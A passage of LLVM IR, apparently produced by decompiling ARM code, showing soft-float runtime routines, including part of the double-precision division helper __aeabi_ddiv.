  %v1_1ca44 = add i32 %v2_1ca3c, 12
  %v8_1ca48 = icmp sgt i32 %v1_1ca44, 0
  br i1 %v8_1ca48, label %dec_label_pc_1ca7c, label %dec_label_pc_1ca4c

dec_label_pc_1ca4c:                               ; preds = %dec_label_pc_1ca44
  %v1_1ca4c = add i32 %v2_1ca3c, 32
  %v1_1ca50 = sub i32 0, %v2_1ca3c
  %v0_1ca54 = load i32, i32* @r1, align 4
  %v6_1ca54 = shl i32 %v0_1ca54, %v1_1ca50
  %v2_1ca58 = add i32 %v2_1ca3c, 31
  %v3_1ca58 = shl i32 1, %v2_1ca58
  %v6_1ca58 = lshr i32 %v0_1ca54, %v1_1ca4c
  %v1_1ca5c = load i32, i32* %r0.global-to-local, align 4
  %v7_1ca5c = shl i32 %v1_1ca5c, %v1_1ca50
  %v8_1ca5c = or i32 %v7_1ca5c, %v6_1ca58
  %v1_1ca60 = and i32 %v1_1ca5c, -2147483648
  %tmp = bitcast i32 %v1_1ca5c to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1ca64 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1ca54, 0
  %v4_1ca68 = zext i1 %tmp14 to i32
  %v5_1ca68 = add i32 %v8_1ca5c, %v4_1ca68
  store i32 %v5_1ca68, i32* @r1, align 4
  %v5_1ca6c = and i32 %v1_1ca64, %v3_1ca58
  %v6_1ca6c = icmp ne i32 %v5_1ca6c, 0
  %v7_1ca6c = lshr i32 %v1_1ca64, %v1_1ca4c
  %v9_1ca6c = add i32 %v7_1ca6c, %v1_1ca60
  %v10_1ca6c = zext i1 %v6_1ca6c to i32
  %v11_1ca6c = add i32 %v9_1ca6c, %v10_1ca6c
  store i32 %v11_1ca6c, i32* %r0.global-to-local, align 4
  %v19_1ca6c = add i32 %v11_1ca6c, %v10_1ca6c
  %v20_1ca6c = xor i32 %v19_1ca6c, %v1_1ca5c
  %v21_1ca6c = xor i32 %v19_1ca6c, %v7_1ca6c
  %v22_1ca6c = and i32 %v20_1ca6c, %v21_1ca6c
  %v23_1ca6c = icmp slt i32 %v22_1ca6c, 0
  store i1 %v23_1ca6c, i1* @cpsr_v, align 1
  %v0_1ca70 = load i32, i32* @lr, align 4
  %v3_1ca70 = mul i32 %v6_1ca54, 2
  %v4_1ca70 = or i32 %v0_1ca70, %v3_1ca70
  %v5_1ca70 = icmp slt i32 %v4_1ca70, 0
  store i1 %v5_1ca70, i1* @cpsr_n, align 1
  %v6_1ca70 = icmp eq i32 %v4_1ca70, 0
  store i1 %v6_1ca70, i1* @cpsr_z, align 1
  br i1 %v6_1ca70, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1ca4c
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1ca74 = add nsw i32 %tmp15, -1
  %v7_1ca74 = and i32 %v5_1ca68, %v6_1ca74
  store i32 %v7_1ca74, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1ca4c, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1ca6c

dec_label_pc_1ca7c:                               ; preds = %dec_label_pc_1ca44
  %v1_1ca7c = sub i32 0, %v2_1ca3c
  %v1_1ca80 = add i32 %v2_1ca3c, 32
  %v0_1ca84 = load i32, i32* @r1, align 4
  %v6_1ca84 = shl i32 %v0_1ca84, %v1_1ca7c
  %v6_1ca88 = lshr i32 %v0_1ca84, %v1_1ca80
  %v1_1ca8c = load i32, i32* %r0.global-to-local, align 4
  %v7_1ca8c = shl i32 %v1_1ca8c, %v1_1ca7c
  %v8_1ca8c = or i32 %v7_1ca8c, %v6_1ca88
  %v1_1ca90 = and i32 %v1_1ca8c, -2147483648
  %tmp16 = icmp slt i32 %v6_1ca84, 0
  %v4_1ca94 = zext i1 %tmp16 to i32
  %v5_1ca94 = add i32 %v8_1ca8c, %v4_1ca94
  store i32 %v5_1ca94, i32* @r1, align 4
  %v6_1ca94 = icmp ult i32 %v5_1ca94, %v8_1ca8c
  %v2_1ca98 = zext i1 %v6_1ca94 to i32
  %v3_1ca98 = or i32 %v2_1ca98, %v1_1ca90
  store i32 %v3_1ca98, i32* %r0.global-to-local, align 4
  %v9_1ca98 = add nsw i32 %v3_1ca98, %v2_1ca98
  %v10_1ca98 = sub i32 0, %v1_1ca8c
  %v11_1ca98 = and i32 %v9_1ca98, %v10_1ca98
  %v12_1ca98 = icmp slt i32 %v11_1ca98, 0
  store i1 %v12_1ca98, i1* @cpsr_v, align 1
  %v0_1ca9c = load i32, i32* @lr, align 4
  %v3_1ca9c = mul i32 %v6_1ca84, 2
  %v4_1ca9c = or i32 %v0_1ca9c, %v3_1ca9c
  %v5_1ca9c = icmp slt i32 %v4_1ca9c, 0
  store i1 %v5_1ca9c, i1* @cpsr_n, align 1
  %v6_1ca9c = icmp eq i32 %v4_1ca9c, 0
  store i1 %v6_1ca9c, i1* @cpsr_z, align 1
  br i1 %v6_1ca9c, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1ca7c
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1caa0 = add nsw i32 %tmp17, -1
  %v7_1caa0 = and i32 %v5_1ca94, %v6_1caa0
  store i32 %v7_1caa0, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1ca7c, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1ca98

dec_label_pc_1caa8:                               ; preds = %bb6
  %v1_1caa8 = sub i32 32, %v2_1ca3c
  %v0_1caac = load i32, i32* @lr, align 4
  %v1_1caac = load i32, i32* @r1, align 4
  %v7_1caac = shl i32 %v1_1caac, %v1_1caa8
  %v8_1caac = or i32 %v7_1caac, %v0_1caac
  %v6_1cab0 = lshr i32 %v1_1caac, %v2_1ca3c
  %v1_1cab4 = load i32, i32* %r0.global-to-local, align 4
  %v7_1cab4 = shl i32 %v1_1cab4, %v1_1caa8
  %v8_1cab4 = or i32 %v7_1cab4, %v6_1cab0
  %v6_1cab8 = lshr i32 %v1_1cab4, %v2_1ca3c
  %v1_1cabc = and i32 %v1_1cab4, -2147483648
  store i32 %v1_1cabc, i32* %r0.global-to-local, align 4
  %v7_1cac0 = lshr i32 %v1_1cabc, %v2_1ca3c
  %v8_1cac0 = sub i32 -1, %v7_1cac0
  %v9_1cac0 = and i32 %v6_1cab8, %v8_1cac0
  %tmp18 = icmp slt i32 %v8_1cab4, 0
  %v4_1cac4 = zext i1 %tmp18 to i32
  %v5_1cac4 = add i32 %v4_1cac4, %v9_1cac0
  store i32 %v5_1cac4, i32* @r1, align 4
  %v3_1cac8 = mul i32 %v8_1cab4, 2
  %v4_1cac8 = or i32 %v8_1caac, %v3_1cac8
  %v5_1cac8 = icmp slt i32 %v4_1cac8, 0
  store i1 %v5_1cac8, i1* @cpsr_n, align 1
  %v6_1cac8 = icmp eq i32 %v4_1cac8, 0
  store i1 %v6_1cac8, i1* @cpsr_z, align 1
  br i1 %v6_1cac8, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1caa8
  %tmp19 = sext i1 %tmp18 to i32
  %v6_1cacc = add nsw i32 %tmp19, -1
  %v7_1cacc = and i32 %v5_1cac4, %v6_1cacc
  store i32 %v7_1cacc, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1caa8, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1cabc

dec_label_pc_1cb8c:                               ; preds = %dec_label_pc_1ca24
  %v0_1cb8c = load i32, i32* %r0.global-to-local, align 4
  %v1_1cb8c = and i32 %v0_1cb8c, -2147483648
  %v1_1cb94 = or i32 %v1_1cb8c, 2146435072
  store i32 %v1_1cb94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1cb94

; uselistorder directives
  uselistorder i32 %v3_1ca98, { 2, 0, 1 }
  uselistorder i32 %v8_1ca8c, { 1, 0 }
  uselistorder i32 %v1_1ca7c, { 1, 0 }
  uselistorder i32 %v11_1ca6c, { 1, 0, 2 }
  uselistorder i32 %v1_1ca5c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ca50, { 1, 0 }
  uselistorder i32 %v2_1ca3c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1ca38, { 1, 0 }
  uselistorder i32 %v4_1ca28, { 1, 2, 0 }
  uselistorder i32 %v0_1ca28, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 125, 126, 31, 53, 139, 140, 112, 113, 114, 0, 115, 8, 116, 54, 153, 154, 155, 56, 143, 34, 16, 55, 1, 17, 18, 94, 144, 4, 119, 19, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 145, 141, 142, 6, 57, 60, 61, 58, 59, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 146, 72, 5, 73, 47, 48, 20, 147, 21, 148, 22, 149, 13, 152, 74, 75, 76, 14, 158, 159, 160, 161, 162, 163, 15, 164, 165, 166, 167, 168, 169, 23, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 150, 151, 24, 77, 103, 110, 78, 79, 170, 171, 172, 2, 104, 156, 9, 157, 10, 105, 3, 174, 25, 26, 120, 121, 122, 123, 177, 7, 138, 117, 118, 97, 11, 80, 81, 175, 82, 83, 111, 84, 173, 85, 86, 87, 88, 27, 49, 50, 51, 89, 90, 176, 91, 92, 93, 178, 28, 95, 96, 98, 99, 52, 100, 101, 12, 29, 32, 33, 30, 102, 106, 107, 108, 109, 124 }
  uselistorder i32 -32, { 3, 2, 4, 5, 6, 7, 13, 8, 14, 15, 9, 10, 0, 11, 1, 12 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1cba0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1cba0:
  %v1_1cba4 = or i32 %arg1, 2146959360
  ret i32 %v1_1cba4
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1cbac = load i32, i32* @r4, align 4
  store i32 %v3_1cbac, i32* %stack_var_-16, align 4
  %v6_1cbac = load i32, i32* @r5, align 4
  %v9_1cbac = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1cbb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1cbb8 = udiv i32 %v1_1cbb8, 1048576
  %v5_1cbb8 = urem i32 %v4_1cbb8, 2048
  store i32 %v5_1cbb8, i32* @r4, align 4
  %v6_1cbb8 = icmp eq i32 %v5_1cbb8, 0
  br i1 %v6_1cbb8, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1cbbc = udiv i32 %arg3, 1048576
  %v6_1cbbc = urem i32 %v5_1cbbc, 2048
  store i32 %v6_1cbbc, i32* %r5.global-to-local, align 4
  %v7_1cbbc = icmp eq i32 %v6_1cbbc, 0
  br i1 %v7_1cbbc, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1cd40

bb92:                                             ; preds = %bb
  %v5_1cbc0 = icmp eq i32 %v5_1cbb8, 2047
  br i1 %v5_1cbc0, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_1cbbc, %bb92 ]
  br label %dec_label_pc_1cd40

bb93:                                             ; preds = %bb92
  %v5_1cbc4 = icmp eq i32 %v6_1cbbc, 2047
  br i1 %v5_1cbc4, label %dec_label_pc_1cd40, label %dec_label_pc_1cbcc

dec_label_pc_1cbcc:                               ; preds = %bb93
  %v2_1cbcc = sub nsw i32 %v5_1cbb8, %v6_1cbbc
  store i32 %v2_1cbcc, i32* %r4.global-to-local, align 4
  %v2_1cbd0 = xor i32 %v1_1cbb8, %arg3
  %v4_1cbd4 = mul i32 %arg3, 4096
  %v5_1cbd4 = or i32 %v4_1cbd4, %arg4
  store i32 %v5_1cbd4, i32* %r5.global-to-local, align 4
  %v7_1cbd4 = icmp eq i32 %v5_1cbd4, 0
  %v3_1cbd8 = mul i32 %v1_1cbb8, 4096
  store i32 %v3_1cbd8, i32* %r0.global-to-local, align 4
  br i1 %v7_1cbd4, label %dec_label_pc_1cd10, label %dec_label_pc_1cbe0

dec_label_pc_1cbe0:                               ; preds = %dec_label_pc_1cbcc
  %tmp94 = mul i32 %arg3, 256
  %v4_1cbe8 = and i32 %tmp94, 268435200
  %v4_1cbec = udiv i32 %arg4, 16777216
  %v5_1cbe8 = or i32 %v4_1cbec, %v4_1cbe8
  %v5_1cbec = or i32 %v5_1cbe8, 268435456
  store i32 %v5_1cbec, i32* %r2.global-to-local, align 4
  %v3_1cbf0 = mul i32 %arg4, 256
  store i32 %v3_1cbf0, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_1cbb8, 256
  %v4_1cbf4 = and i32 %tmp95, 268435200
  %v1_1cbf8 = load i32, i32* @r1, align 4
  %v4_1cbf8 = udiv i32 %v1_1cbf8, 16777216
  %v5_1cbf4 = or i32 %v4_1cbf4, %v4_1cbf8
  %v5_1cbf8 = or i32 %v5_1cbf4, 268435456
  store i32 %v5_1cbf8, i32* %r5.global-to-local, align 4
  %v3_1cbfc = mul i32 %v1_1cbf8, 256
  store i32 %v3_1cbfc, i32* %r6.global-to-local, align 4
  %v1_1cc00 = and i32 %v2_1cbd0, -2147483648
  store i32 %v1_1cc00, i32* %r0.global-to-local, align 4
  %v3_1cc04 = icmp uge i32 %v5_1cbf8, %v5_1cbec
  %v9_1cc04 = icmp eq i32 %v5_1cbf8, %v5_1cbec
  br i1 %v9_1cc04, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_1cbe0
  %v4_1cc08 = icmp uge i32 %v3_1cbfc, %v3_1cbf0
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_1cbe0, %bb96
  %v1_1cc0c = phi i1 [ %v3_1cc04, %dec_label_pc_1cbe0 ], [ %v4_1cc08, %bb96 ]
  %v2_1cc0c = add nsw i32 %v2_1cbcc, 253
  %v3_1cc0c = zext i1 %v1_1cc0c to i32
  %v4_1cc0c = add nsw i32 %v2_1cc0c, %v3_1cc0c
  %v8_1cc0c = icmp ule i32 %v4_1cc0c, %v2_1cbcc
  %v9_1cc0c = icmp ugt i32 %v2_1cbcc, -254
  %v10_1cc0c = select i1 %v1_1cc0c, i1 %v8_1cc0c, i1 %v9_1cc0c
  %v1_1cc10 = add nsw i32 %v4_1cc0c, 768
  store i32 %v1_1cc10, i32* %r4.global-to-local, align 4
  br i1 %v10_1cc0c, label %dec_label_pc_1cc20, label %dec_label_pc_1cc18

dec_label_pc_1cc18:                               ; preds = %bb97
  %v3_1cc18 = udiv i32 %v5_1cbec, 2
  store i32 %v3_1cc18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cc20

dec_label_pc_1cc20:                               ; preds = %bb97, %dec_label_pc_1cc18
  %v0_1cc28 = phi i32 [ %v5_1cbec, %bb97 ], [ %v3_1cc18, %dec_label_pc_1cc18 ]
  %v0_1cc2c = phi i32 [ %v3_1cbf0, %bb97 ], [ 0, %dec_label_pc_1cc18 ]
  %v2_1cc20 = sub i32 %v3_1cbfc, %v0_1cc2c
  store i32 %v2_1cc20, i32* %r6.global-to-local, align 4
  %v3_1cc20 = icmp uge i32 %v3_1cbfc, %v0_1cc2c
  %v3_1cc24 = icmp eq i1 %v3_1cc20, false
  %v4_1cc24 = sub nsw i32 %v5_1cbf8, %v0_1cc28
  %v6_1cc24 = sext i1 %v3_1cc24 to i32
  %v7_1cc24 = add nsw i32 %v6_1cc24, %v4_1cc24
  store i32 %v7_1cc24, i32* %r5.global-to-local, align 4
  %v3_1cc28 = udiv i32 %v0_1cc28, 2
  store i32 %v3_1cc28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cc38.outer

dec_label_pc_1cc38.outer:                         ; preds = %dec_label_pc_1ccd0, %dec_label_pc_1cc20
  %v1_1cce4.ph = phi i32 [ %v2_1ccd0, %dec_label_pc_1ccd0 ], [ %v1_1cc00, %dec_label_pc_1cc20 ]
  %v0_1cc3c.ph = phi i32 [ %v5_1ccac, %dec_label_pc_1ccd0 ], [ %v7_1cc24, %dec_label_pc_1cc20 ]
  %v1_1cc40.ph = phi i32 [ %v3_1ccb0, %dec_label_pc_1ccd0 ], [ %v2_1cc20, %dec_label_pc_1cc20 ]
  %v5_1ccb817.ph = phi i32 [ %v5_1ccb8, %dec_label_pc_1ccd0 ], [ %v3_1cc28, %dec_label_pc_1cc20 ]
  %v3_1ccbc13.ph = phi i32 [ %v3_1ccbc, %dec_label_pc_1ccd0 ], [ 0, %dec_label_pc_1cc20 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_1ccd0 ], [ 1048576, %dec_label_pc_1cc20 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1ccd0 ], [ 524288, %dec_label_pc_1cc20 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1cc38

dec_label_pc_1cc38:                               ; preds = %dec_label_pc_1cc38.outer, %dec_label_pc_1cca8
  %v1_1cc9c59 = phi i32 [ %v2_1cce4, %dec_label_pc_1cca8 ], [ %storemerge136, %dec_label_pc_1cc38.outer ]
  %v1_1cc48 = phi i32 [ %v1_1cc4832, %dec_label_pc_1cca8 ], [ %storemerge136, %dec_label_pc_1cc38.outer ]
  %v1_1cc6441 = phi i32 [ %v1_1cc6443, %dec_label_pc_1cca8 ], [ %storemerge136, %dec_label_pc_1cc38.outer ]
  %v1_1cc8050 = phi i32 [ %v1_1cc8052, %dec_label_pc_1cca8 ], [ %storemerge136, %dec_label_pc_1cc38.outer ]
  %v0_1ccc0 = phi i32 [ %v3_1ccc0, %dec_label_pc_1cca8 ], [ %storemerge, %dec_label_pc_1cc38.outer ]
  %v0_1cc3c = phi i32 [ %v5_1ccac, %dec_label_pc_1cca8 ], [ %v0_1cc3c.ph, %dec_label_pc_1cc38.outer ]
  %v1_1cc40 = phi i32 [ %v3_1ccb0, %dec_label_pc_1cca8 ], [ %v1_1cc40.ph, %dec_label_pc_1cc38.outer ]
  %v5_1ccb817 = phi i32 [ %v5_1ccb8, %dec_label_pc_1cca8 ], [ %v5_1ccb817.ph, %dec_label_pc_1cc38.outer ]
  %v3_1ccbc13 = phi i32 [ %v3_1ccbc, %dec_label_pc_1cca8 ], [ %v3_1ccbc13.ph, %dec_label_pc_1cc38.outer ]
  %v3_1cc38 = icmp uge i32 %v1_1cc40, %v3_1ccbc13
  %v3_1cc3c = icmp eq i1 %v3_1cc38, false
  %v4_1cc3c = sub i32 %v0_1cc3c, %v5_1ccb817
  %v6_1cc3c = sext i1 %v3_1cc3c to i32
  %v7_1cc3c = add i32 %v6_1cc3c, %v4_1cc3c
  %v8_1cc3c = zext i1 %v3_1cc3c to i32
  %v9_1cc3c = sub i32 %v7_1cc3c, %v8_1cc3c
  %v10_1cc3c = icmp ult i32 %v0_1cc3c, %v9_1cc3c
  %v11_1cc3c = icmp ne i32 %v5_1ccb817, -1
  %v12_1cc3c = or i1 %v11_1cc3c, %v10_1cc3c
  %v13_1cc3c = icmp ult i32 %v0_1cc3c, %v5_1ccb817
  %v14_1cc3c = select i1 %v3_1cc3c, i1 %v12_1cc3c, i1 %v13_1cc3c
  br i1 %v14_1cc3c, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1cc38
  %v3_1cc40 = sub i32 %v1_1cc40, %v3_1ccbc13
  store i32 %v3_1cc40, i32* %r6.global-to-local, align 4
  store i32 %v7_1cc3c, i32* %r5.global-to-local, align 4
  %v3_1cc48 = or i32 %v1_1cc48, %v0_1ccc0
  store i32 %v3_1cc48, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1cc38, %bb98
  %v1_1cc9c58 = phi i32 [ %v1_1cc9c59, %dec_label_pc_1cc38 ], [ %v3_1cc48, %bb98 ]
  %v1_1cc4835 = phi i32 [ %v1_1cc48, %dec_label_pc_1cc38 ], [ %v3_1cc48, %bb98 ]
  %v1_1cc64 = phi i32 [ %v1_1cc6441, %dec_label_pc_1cc38 ], [ %v3_1cc48, %bb98 ]
  %v1_1cc8049 = phi i32 [ %v1_1cc8050, %dec_label_pc_1cc38 ], [ %v3_1cc48, %bb98 ]
  %v0_1cc58 = phi i32 [ %v0_1cc3c, %dec_label_pc_1cc38 ], [ %v7_1cc3c, %bb98 ]
  %v1_1cc5c = phi i32 [ %v1_1cc40, %dec_label_pc_1cc38 ], [ %v3_1cc40, %bb98 ]
  %v1_1cc4c = urem i32 %v5_1ccb817, 2
  %v2_1cc4c = icmp ne i32 %v1_1cc4c, 0
  %v3_1cc4c = udiv i32 %v5_1ccb817, 2
  %v3_1cc50 = zext i1 %v2_1cc4c to i32
  %v6_1cc50 = zext i32 %v3_1ccbc13 to i64
  %v7_1cc50 = sub i32 33, %v3_1ccbc13
  %v8_1cc50 = zext i32 %v7_1cc50 to i64
  %v9_1cc50 = shl i64 %v6_1cc50, %v8_1cc50
  %v10_1cc50 = sub i32 32, %v3_1ccbc13
  %v11_1cc50 = shl i32 %v3_1cc50, %v10_1cc50
  %v12_1cc50 = zext i32 %v11_1cc50 to i64
  %v14_1cc50 = or i64 %v12_1cc50, %v9_1cc50
  %v15_1cc50 = trunc i64 %v14_1cc50 to i32
  %v3_1cc54 = icmp uge i32 %v1_1cc5c, %v15_1cc50
  %v3_1cc58 = icmp eq i1 %v3_1cc54, false
  %v4_1cc58 = sub i32 %v0_1cc58, %v3_1cc4c
  %v6_1cc58 = sext i1 %v3_1cc58 to i32
  %v7_1cc58 = add i32 %v6_1cc58, %v4_1cc58
  %v13_1cc58 = icmp ult i32 %v0_1cc58, %v3_1cc4c
  %v14_1cc58 = or i1 %v13_1cc58, %v3_1cc58
  br i1 %v14_1cc58, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1cc5c = sub i32 %v1_1cc5c, %v15_1cc50
  store i32 %v3_1cc5c, i32* %r6.global-to-local, align 4
  store i32 %v7_1cc58, i32* %r5.global-to-local, align 4
  %v5_1cc64 = udiv i32 %v0_1ccc0, 2
  %v6_1cc64 = or i32 %v1_1cc64, %v5_1cc64
  store i32 %v6_1cc64, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1cc9c57 = phi i32 [ %v1_1cc9c58, %.thread4 ], [ %v6_1cc64, %bb99 ]
  %v1_1cc4834 = phi i32 [ %v1_1cc4835, %.thread4 ], [ %v6_1cc64, %bb99 ]
  %v1_1cc6445 = phi i32 [ %v1_1cc64, %.thread4 ], [ %v6_1cc64, %bb99 ]
  %v1_1cc80 = phi i32 [ %v1_1cc8049, %.thread4 ], [ %v6_1cc64, %bb99 ]
  %v0_1cc74 = phi i32 [ %v0_1cc58, %.thread4 ], [ %v7_1cc58, %bb99 ]
  %v1_1cc78 = phi i32 [ %v1_1cc5c, %.thread4 ], [ %v3_1cc5c, %bb99 ]
  %v1_1cc68 = urem i32 %v3_1cc4c, 2
  %v2_1cc68 = icmp ne i32 %v1_1cc68, 0
  %v3_1cc68 = udiv i32 %v5_1ccb817, 4
  %v3_1cc6c = zext i1 %v2_1cc68 to i32
  %v6_1cc6c = and i64 %v14_1cc50, 4294967295
  %v7_1cc6c = sub i32 33, %v15_1cc50
  %v8_1cc6c = zext i32 %v7_1cc6c to i64
  %v9_1cc6c = shl i64 %v6_1cc6c, %v8_1cc6c
  %v10_1cc6c = sub i32 32, %v15_1cc50
  %v11_1cc6c = shl i32 %v3_1cc6c, %v10_1cc6c
  %v12_1cc6c = zext i32 %v11_1cc6c to i64
  %v14_1cc6c = or i64 %v12_1cc6c, %v9_1cc6c
  %v15_1cc6c = trunc i64 %v14_1cc6c to i32
  %v3_1cc70 = icmp uge i32 %v1_1cc78, %v15_1cc6c
  %v3_1cc74 = icmp eq i1 %v3_1cc70, false
  %v4_1cc74 = sub i32 %v0_1cc74, %v3_1cc68
  %v6_1cc74 = sext i1 %v3_1cc74 to i32
  %v7_1cc74 = add i32 %v6_1cc74, %v4_1cc74
  %v13_1cc74 = icmp ult i32 %v0_1cc74, %v3_1cc68
  %v14_1cc74 = or i1 %v13_1cc74, %v3_1cc74
  br i1 %v14_1cc74, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1cc78 = sub i32 %v1_1cc78, %v15_1cc6c
  store i32 %v3_1cc78, i32* %r6.global-to-local, align 4
  store i32 %v7_1cc74, i32* %r5.global-to-local, align 4
  %v5_1cc80 = udiv i32 %v0_1ccc0, 4
  %v6_1cc80 = or i32 %v1_1cc80, %v5_1cc80
  store i32 %v6_1cc80, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1cc9c = phi i32 [ %v1_1cc9c57, %.thread6 ], [ %v6_1cc80, %bb100 ]
  %v1_1cc4833 = phi i32 [ %v1_1cc4834, %.thread6 ], [ %v6_1cc80, %bb100 ]
  %v1_1cc6444 = phi i32 [ %v1_1cc6445, %.thread6 ], [ %v6_1cc80, %bb100 ]
  %v1_1cc8053 = phi i32 [ %v1_1cc80, %.thread6 ], [ %v6_1cc80, %bb100 ]
  %v0_1cc90 = phi i32 [ %v0_1cc74, %.thread6 ], [ %v7_1cc74, %bb100 ]
  %v1_1cc94 = phi i32 [ %v1_1cc78, %.thread6 ], [ %v3_1cc78, %bb100 ]
  %v1_1cc84 = urem i32 %v3_1cc68, 2
  %v2_1cc84 = icmp ne i32 %v1_1cc84, 0
  %v3_1cc84 = udiv i32 %v5_1ccb817, 8
  %v3_1cc88 = zext i1 %v2_1cc84 to i32
  %v6_1cc88 = and i64 %v14_1cc6c, 4294967295
  %v7_1cc88 = sub i32 33, %v15_1cc6c
  %v8_1cc88 = zext i32 %v7_1cc88 to i64
  %v9_1cc88 = shl i64 %v6_1cc88, %v8_1cc88
  %v10_1cc88 = sub i32 32, %v15_1cc6c
  %v11_1cc88 = shl i32 %v3_1cc88, %v10_1cc88
  %v12_1cc88 = zext i32 %v11_1cc88 to i64
  %v14_1cc88 = or i64 %v12_1cc88, %v9_1cc88
  %v15_1cc88 = trunc i64 %v14_1cc88 to i32
  %v3_1cc8c = icmp uge i32 %v1_1cc94, %v15_1cc88
  %v3_1cc90 = icmp eq i1 %v3_1cc8c, false
  %v4_1cc90 = sub i32 %v0_1cc90, %v3_1cc84
  %v6_1cc90 = sext i1 %v3_1cc90 to i32
  %v7_1cc90 = add i32 %v6_1cc90, %v4_1cc90
  %v13_1cc90 = icmp ult i32 %v0_1cc90, %v3_1cc84
  %v14_1cc90 = or i1 %v13_1cc90, %v3_1cc90
  br i1 %v14_1cc90, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1cc94 = sub i32 %v1_1cc94, %v15_1cc88
  store i32 %v3_1cc94, i32* %r6.global-to-local, align 4
  store i32 %v7_1cc90, i32* %r5.global-to-local, align 4
  %v5_1cc9c = udiv i32 %v0_1ccc0, 8
  %v6_1cc9c = or i32 %v1_1cc9c, %v5_1cc9c
  store i32 %v6_1cc9c, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_1ccac = phi i32 [ %v1_1cc94, %.thread8 ], [ %v3_1cc94, %bb102 ]
  %v0_1cca8 = phi i32 [ %v0_1cc90, %.thread8 ], [ %v7_1cc90, %bb102 ]
  %v2_1cce4 = phi i32 [ %v1_1cc9c, %.thread8 ], [ %v6_1cc9c, %bb102 ]
  %v1_1cc4832 = phi i32 [ %v1_1cc4833, %.thread8 ], [ %v6_1cc9c, %bb102 ]
  %v1_1cc6443 = phi i32 [ %v1_1cc6444, %.thread8 ], [ %v6_1cc9c, %bb102 ]
  %v1_1cc8052 = phi i32 [ %v1_1cc8053, %.thread8 ], [ %v6_1cc9c, %bb102 ]
  %v2_1cca0 = or i32 %v0_1cca8, %v1_1ccac
